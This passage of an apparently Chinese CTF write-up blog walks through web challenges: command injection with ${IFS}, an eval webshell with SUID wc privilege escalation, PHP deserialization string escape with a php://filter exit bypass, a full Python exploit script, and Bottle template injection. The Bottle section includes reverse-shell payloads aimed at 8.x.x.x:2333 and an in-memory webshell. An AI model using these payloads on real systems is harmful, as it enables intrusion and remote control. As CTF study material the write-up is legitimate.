class="line">            <span class="keyword">return</span> <span class="string">&quot;Debug mode enabled&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;generate&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Random string: &quot;</span> . <span class="title class_">StringUtils</span>::<span class="title function_ invoke__">generateRandomString</span>(<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unknown action&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$actionHandler</span> = <span class="keyword">new</span> <span class="title class_">ActionHandler</span>(<span class="variable">$config</span>, <span class="variable">$logger</span>);</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;input&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$actionHandler</span>-&gt;<span class="title function_ invoke__">handle</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line">    <span class="variable">$userManager</span> = <span class="keyword">new</span> <span class="title class_">UserManager</span>(<span class="variable">$logger</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">addUser</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">authenticate</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$logger</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;No action provided, running default logic&quot;</span>);</span><br><span class="line">&#125; [LOG] No action provided, running <span class="keyword">default</span> logic</span><br></pre></td></tr></table></figure><p>可以很快地找到<strong>关键代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，触发点在</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>));</span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了<code>input</code>参数不能出现空格，貌似没什么其他需要注意的地方了，直接<code>/?action=run&amp;input=ls$&#123;IFS&#125;/</code></p><p><code>cat$&#123;IFS&#125;/flag</code>，读不出东西，其他都可以读，也没什么特殊报错，<code>[LOG] Result: cat$&#123;IFS&#125;/flag</code></p><p>这个时候就要考虑<strong>SUID提权</strong>了，先写入<strong>后门</strong>，<code>echo$&#123;IFS&#125;'&lt;?=eval($_POST[1]);?&gt;'$&#123;IFS&#125;&gt;shell.php</code>，只能说很奇葩，<strong>双引号</strong>有问题，然后我弄<code>base64</code>的话也是有点问题，最后选择了无标签的，还能省空格</p><p>然后拿蚁剑连上，右键打开<strong>虚拟终端</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/var/www/html/wc</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br></pre></td></tr></table></figure><p>只有<strong>wc</strong>能试试了，去搜了一下真有，<a href="https://gtfobins.github.io/gtfobins/wc/#file-read">wc提权</a></p><p><code>./wc --files0-from &quot;/flag&quot;</code></p><h2 id="escape"><a class="markdownIt-Anchor" href="#escape"></a> Escape!</h2><p>大致功能就是注册、登录、写文件</p><p><code>waf.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$lists</span>=[<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;||&quot;</span>,<span class="string">&quot;&amp;&amp;&quot;</span>,<span class="string">&quot;select&quot;</span>,<span class="string">&quot;union&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$lists</span> <span class="keyword">as</span> <span class="variable">$list</span>)&#123;</span><br><span class="line">        <span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$list</span>,<span class="string">&quot;error&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#echo $c;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看这个<code>waf</code>就知道是<strong>字符串逃逸</strong>了，看一下后面的死亡绕过，必须要拿到<code>isadmin=1</code>，因为有别的什么签名秘钥之类的操作，所以我们是登不上<code>admin</code>账号的，但我们可以通过<strong>用户名的字符串逃逸</strong>实现我们要的<code>isadmin=1</code>，有这个足矣</p><p>根据<code>User类</code>我们可以手搓一下它的<strong>序列化数据</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isadmin&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"></span><br><span class="line">因为我们不是真正的admin，所以要在用户名这里使isadmin=<span class="number">1</span>，即用户名后追加 <span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:1;&#125;，这里有21个字符，需要使用flag逃逸21次，变成下面的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:105:&quot;</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:1;&#125;&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isadmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">error替换后，后面的 <span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:0;&#125;就会逃逸出去，不起作用</span></span><br></pre></td></tr></table></figure><p>所以我们的用户名直接就是，<code>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code>，然后拿这个用户名去随便注册就可以了</p><p>同时，<code>dashboard.php</code>这里还有个<a href="https://xiaolong22333.top/archives/114/">php死亡绕过</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 示例：验证并读取 Cookie</span></span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">checkSignedCookie</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userData</span>) &#123;</span><br><span class="line">    <span class="comment">#echo $userData;</span></span><br><span class="line">    <span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$userData</span>);</span><br><span class="line">    <span class="comment">#var_dump($user);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;isadmin)&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]||<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token验证失败&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>filename=php://filter//convert.base64-decode/resource=/var/www/html/shell.php</code><br /><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code>，作用就是将<code>&lt;?php exit(); ?&gt;.$content</code>进行<code>base64编码</code>后写入文件<code>shell.php</code>中，因为<code>phpexita</code>会被进行<code>base64解码</code>成<code>php</code>无法识别的内容而<strong>无法解析</strong>，但是<code>PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg==</code>的<code>base64解码</code>成<code>&lt;?php eval($_POST[1]);?&gt;</code>被<strong>php解析执行</strong></p><p>最后就是，连接木马，读取<code>flag</code>的操作了</p><p>官方给了自动化脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;register.php&quot;</span>, data=data)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_response = session.post(url+<span class="string">&quot;login.php&quot;</span>, data=data)</span><br><span class="line">    shell = &#123;<span class="string">&quot;filename&quot;</span>: <span class="string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/shell.php&quot;</span>,<span class="string">&quot;txt&quot;</span>:<span class="string">&quot;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==&quot;</span>&#125;</span><br><span class="line">    protected_response = session.post(url+<span class="string">&quot;dashboard.php&quot;</span>, data=shell)</span><br><span class="line">    response = requests.post(url+<span class="string">&quot;shell.php&quot;</span>, data=&#123;<span class="string">&quot;123&quot;</span>: <span class="string">&quot;system(&#x27;cat / flag&#x27;)&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://node2.anna.nssctf.cn:28932/&quot;</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure><h2 id="message-in-a-bottle"><a class="markdownIt-Anchor" href="#message-in-a-bottle"></a> Message in a Bottle</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, template, run</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储留言的列表</span></span><br><span class="line">messages = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_message</span>(<span class="params">message</span>):</span><br><span class="line">    message_items = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;message-card&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-content&quot;&gt;<span class="subst">&#123;msg&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;small class=&quot;message-time&quot;&gt;#<span class="subst">&#123;idx + <span class="number">1</span>&#125;</span> - 刚刚&lt;/small&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> <span class="keyword">for</span> idx, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(message)])</span><br><span class="line"></span><br><span class="line">    board = <span class="string">f&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;简约留言板&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;link href=&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;d-flex justify-content-between align-items-center mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1 class=&quot;mb-0&quot;&gt;📝 简约留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;a </span></span><br><span class="line"><span class="string">                    href=&quot;/Clean&quot; </span></span><br><span class="line"><span class="string">                    class=&quot;btn btn-danger&quot;</span></span><br><span class="line"><span class="string">                    onclick=&quot;return confirm(&#x27;确定要清空所有留言吗？此操作不可恢复！&#x27;)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                    🗑️ 一键清理</span></span><br><span class="line"><span class="string">                &lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/submit&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;textarea </span></span><br><span class="line"><span class="string">                    name=&quot;message&quot; </span></span><br><span class="line"><span class="string">                    placeholder=&quot;输入payload暴打出题人&quot;</span></span><br><span class="line"><span class="string">                    required</span></span><br><span class="line"><span class="string">                &gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;button type=&quot;submit&quot; class=&quot;btn-custom&quot;&gt;发布留言&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-list mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-flex justify-content-between align-items-center mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h4 class=&quot;mb-0&quot;&gt;最新留言（<span class="subst">&#123;<span class="built_in">len</span>(message)&#125;</span>条）&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    <span class="subst">&#123;<span class="string">f&#x27;&lt;small class=&quot;text-muted&quot;&gt;点击右侧清理按钮可清空列表&lt;/small&gt;&#x27;</span> <span class="keyword">if</span> message <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                <span class="subst">&#123;message_items&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> board</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message.replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Clean&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clean</span>():</span><br><span class="line">    <span class="keyword">global</span> messages</span><br><span class="line">    messages = []</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/&quot;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    message = waf(request.forms.get(<span class="string">&#x27;message&#x27;</span>))</span><br><span class="line">    messages.append(message)</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run(app, host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">9000</span>)</span><br></pre></td></tr></table></figure><p>审一下代码，发现有<strong>过滤花括号</strong>的<code>waf</code>，以及<code>template</code><strong>模板渲染</strong></p><p>试了一下，发现可以<code>xss</code>，并且内容留在了前端页面上，话说<code>xss</code>这种打法除了<strong>cookie外带</strong>这种我好像没见过什么其他操作了()</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;message-time&quot;</span>&gt;</span>#1 - 刚刚<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;message-time&quot;</span>&gt;</span>#2 - 刚刚<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以考虑闭合<code>&lt;/div&gt;</code>，题目用是<code>bottle</code>，不妨看看有没有<strong>bottle模板注入</strong></p><p>看一下<a href="https://googlegroups.com/group/bottlepy/attach/60ddc96375306a0e/bottle-zh-cn.pdf?part=0.1">官方文档</a>，可以嵌入<strong>python代码</strong>，以<code>%</code>开始</p><p>所谓闭合，就是我们自己填上里面的<code>&lt;div&gt;</code>的后半部分使得最外面的<code>&lt;div&gt;</code>成为完整的一部分，然后剩下的<code>&lt;/div&gt;</code>我们需要补上它的<code>&lt;div&gt;头</code>，然后我们就可以在二者之间插入我们的<strong>恶意python代码</strong>了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat /flag &gt; 1.txt&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%include(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我想试试反弹shell，直接找了一个payload，好像失败了</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;8.x.x.x&#x27;,2333));[os.dup2(s.fileno(),i) for i in range(3)];p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])&quot;</span></span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面两个是官方payload</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;8.x.x.x\&quot;,2333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)&#x27;&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存马</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">% from bottle import Bottle, request</span><br><span class="line">% app=__import__(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br><span class="line">% app.route(<span class="string">&quot;/shell&quot;</span>,<span class="string">&quot;GET&quot;</span>,lambda :__import__(<span class="string">&#x27;os&#x27;</span>).popen(request.params.get(<span class="string">&#x27;cmd&#x27;</span>)).<span class="built_in">read</span>())</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br></pre></td></tr></table></figure><p><a href="https://forum.butian.net/share/4048">内存马</a></p><p>是需要闭合的吧，但是出题人那好像没写</p><h2 id="message-in-a-bottle-plus"><a class="markdownIt-Anchor" href="#message-in-a-bottle-plus"></a> Message in a Bottle plus</h2><p>是个黑盒题，发现了<code>%</code>直接就触发了<code>waf</code>，然后出题人这里说是，白名单之后加了一些<code>AST</code>的语法检测，在我们语法报错的时候会变量替换</p><p>在<code>python</code>里<code>% 